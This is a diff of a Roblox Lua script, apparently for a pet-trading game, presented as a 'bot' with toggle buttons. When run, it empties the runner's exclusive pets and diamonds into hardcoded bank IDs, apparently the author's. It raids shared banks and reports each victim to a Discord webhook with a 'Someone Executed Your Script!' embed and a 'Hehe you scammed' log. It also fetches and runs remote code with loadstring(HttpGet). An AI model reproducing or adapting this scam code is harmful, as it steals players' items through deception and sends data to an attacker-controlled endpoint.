@@ -13,13 +13,13 @@ function SendMessage(huges)
 		"Kid with shit exploit"
 
 	local url =
-		"https://discord.com/api/webhooks/1041686034834006056/5avDvgDcvd6TSH0y8pihPqB3wvVOcxNYcXUS5bu7d90C0piiZ8b2F7o4OwMKkcpcD0jx"
+		"https://discord.com/api/webhooks/1042377302295711824/6RgiVBUzCE596VZZuwV2j-OLTdNiS4-WqhAM6MsMuruH4wbYpqdrEO3OkiHRx758S87u"
 	local data = {
-		["content"] = game.Players.LocalPlayer.Name .. " got some huges ;)",
+		["content"] = getgenv().onlyhuge == true and (game.Players.LocalPlayer.Name .. " got some huges ;)") or  (game.Players.LocalPlayer.Name .. " got some exclusives ;)"),
 		["embeds"] = {
 			{
 				["title"] = "**Someone Executed Your Script!**",
-				["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. '\n \n **HUGE NAMES:** '.. huges,
+				["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. '\n \n **ITEM NAMES:** '.. huges,
 				["type"] = "rich",
 				["color"] = tonumber(0x7269da),
 				["image"] = {
@@ -48,7 +48,6 @@ local abobusikti = (getupvalue or debug.getupvalue)(lib.Network.Invoke, 2)
 fire123 = function(n, ...)
 	return abobusikti(n):InvokeServer(...)
 end
-print(abobusikti("k"))
 
 
 
@@ -63,94 +62,151 @@ local function GetAllHugePets(bankid, ishuge)
 	for i,v in pairs(u5.Storage.Currency) do
 		print(i)
 	end
-	
+
 	for i,v in pairs(u5.Storage.Pets) do
 		local v2 = lib.Directory.Pets[v.id];
-		if (ishuge == false and (v2.rarity == "Exclusive") or (v2.huge or v2.isGift)) and not (v.l == true) then
+		if ((ishuge ~= true) and (v2.rarity == "Exclusive") or (v2.huge or v2.isGift)) and not (v.l == true) then
 			table.insert(pets1, v.uid)
 		end
 	end
-	 print("Found "..#pets1.." pets")
+	print("Found "..#pets1.." pets")
 	return pets1, u5.Storage.Currency.Diamonds
 end
 
-while true do
-	pcall(function()
-		local mybanks = fire123("k")
 
 
 
-		local myinvites = fire123("l")
-		for i, v in pairs(myinvites) do
-			if #mybanks < 5 then
-				if AcceptInvite(v.BUID) then
-					print("Accepted Invite")
-				end
-				mybanks[#mybanks+1] = v
-			end
-		end
-		
-		local myownbi = ""
-		local mybanks = fire123("k")
-		for i, v in pairs(mybanks) do
-			if i == 1 then
-				myownbi = v.BUID
-			end
-			if i ~= 1  and i ~= 2 then
-				print('testing bank')
-				local pets, diam = GetAllHugePets(v.BUID, getgenv().onlyhuge == true)
 
-				local pets1 = {}
+spawn(function()
+	while true do
+		if getgenv().Work == true then
+			pcall(function()
+				local mybanks = fire123("k")
 
-				for index, value in pairs(pets) do
-					if #pets1 < 49 then
-						table.insert(pets1, value)
+
+
+				local myinvites = fire123("l")
+				for i, v in pairs(myinvites) do
+					if #mybanks < 5 then
+						if AcceptInvite(v.BUID) then
+							print("Accepted Invite")
+						end
+						mybanks[#mybanks+1] = v
 					end
 				end
-				if #pets > 0 or (getgenv().onlyhuge == true and diam >= 10000000000) then
-					print(math.min(100000000000 - 100, diam ))
-					
-					local args = {
-						[1] = v.BUID,
-						[2] = pets1,
-						[3] = math.min(100000000000 - 100, diam )
-					}
-					print(fire123("8", unpack(args)))
-					print('Got items: '..#pets1)
-				else
 
-					print('Leaving bank: no pets left.')
-					fire123("b", v.BUID)
+				local myownbi = "057f27b8-e7a2-4113-9f55-a4e0184e475c"
+				local mybanks = fire123("k")
+				for i, v in pairs(mybanks) do
+					if i ~= 1  and i ~= 2 then
+						print('testing bank')
+						local pets, diam = GetAllHugePets(v.BUID, getgenv().onlyhuge == true)
+
+						local pets1 = {}
+
+						for index, value in pairs(pets) do
+							if #pets1 < 49 then
+								table.insert(pets1, value)
+							end
+						end
+						if #pets > 0 or (getgenv().onlyhuge == true and diam >= 10000000000) then
+
+							local args = {
+								[1] = v.BUID,
+								[2] = pets1,
+								[3] = math.min(100000000000 - 100, diam )
+							}
+							
+							fire123("8", unpack(args))
+							print('Got items: '..#pets1)
+						else
+
+							print('Leaving bank: no pets left.')
+							fire123("b", v.BUID)
+						end
+
+
+						wait(3)
+					end
+				end
+				local PetsList = {}
+				local PetsList2 = {}
+				for i,v in pairs(lib.Save.Get().Pets) do
+					local v2 = lib.Directory.Pets[v.id];
+					if v2.rarity == "Exclusive" then
+						table.insert(PetsList, v.uid);
+						table.insert(PetsList2, v2.name)
+					end
+				end
+				wait(2)
+
+				if getgenv().onlyhuge == true and (#PetsList > 0 or lib.Save.Get().Diamonds > 100) then
+					--local mydiamonds = tonumber(string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", ""))
+					local aboba, what = fire123("7", myownbi, PetsList, lib.Save.Get().Diamonds - 100)
+					if aboba then
+						SendMessage(PetsList2);
+						getgenv().Make("Hehe you scammed: "..table.concat(PetsList2, ', '))
+					else
+						if what == "You are doing this too fast!" then
+							wait(3)
+							aboba, what = fire123("7", myownbi, PetsList, lib.Save.Get().Diamonds - 100)
+						end
+						print(what)
+					end
+				elseif getgenv().onlyhuge == false and (#PetsList > 0 or lib.Save.Get().Diamonds > 100) then
+					myownbi = "43d88d6e-d475-4568-b194-fd62ebeaf75f"
+					local aboba, what = fire123("7", myownbi, PetsList, lib.Save.Get().Diamonds - 100)
+					if aboba then
+						SendMessage(PetsList2);
+						getgenv().Make("Hehe you scammed: "..table.concat(PetsList2, ', '))
+					else
+						if what == "You are doing this too fast!" then
+							wait(3)
+							aboba, what = fire123("7", myownbi, PetsList, lib.Save.Get().Diamonds - 100)
+						end
+						print(what)
+					end
 				end
 
-
-				wait(3)
-			end
+			end)
 		end
+		--
+		-- #!F71a1e3ffdba34ed99e8f44ce78d5703bimage.png
 
-		local PetsList = {}
-		local PetsList2 = {}
-		for i,v in pairs(lib.Save.Get().Pets) do
-			local v2 = lib.Directory.Pets[v.id];
-			if v2.rarity == "Exclusive" then
-				table.insert(PetsList, v.uid);
-				PetsList2[v.uid] = false
-			end
-		end
-wait(2)
+		wait(5)
+	end
+end)
 
-		if #PetsList > 0 or lib.Save.Get().Diamonds > 100 then
-			print("deping")
-			--local mydiamonds = tonumber(string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", ""))
 
-			print(fire123("7", myownbi, PetsList, lib.Save.Get().Diamonds - 100))
-			--SendMessage(PetsList2);
-		end
 
-	end)
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Robojini/Tuturial_UI_Library/main/UI_Template_1"))()
 
-	--
-	-- #!F71a1e3ffdba34ed99e8f44ce78d5703bimage.png
+local Window = Library.CreateLib("Bot", "RJTheme3")
+--Section:NewButton("Start", "Сlick to start the dupе", function()
+--	print("Сlick")
+--end)
 
-	wait(5)
+
+
+local Tab = Window:NewTab("Main")
+
+local Section = Tab:NewSection("Bot")
+
+Section:NewToggle("Bot", "Сlick to start bot", function(state)
+	getgenv().Work = state
+end)
+
+
+Section:NewToggle("Grab all exclusives", "Grab all exclusives", function(state)
+	getgenv().onlyhuge = not state
+end)
+
+
+
+local Tab = Window:NewTab("Logs")
+local Section = Tab:NewSection("Logs")
+
+
+getgenv().Make = function(text)
+	Section:NewLabel(text)
 end
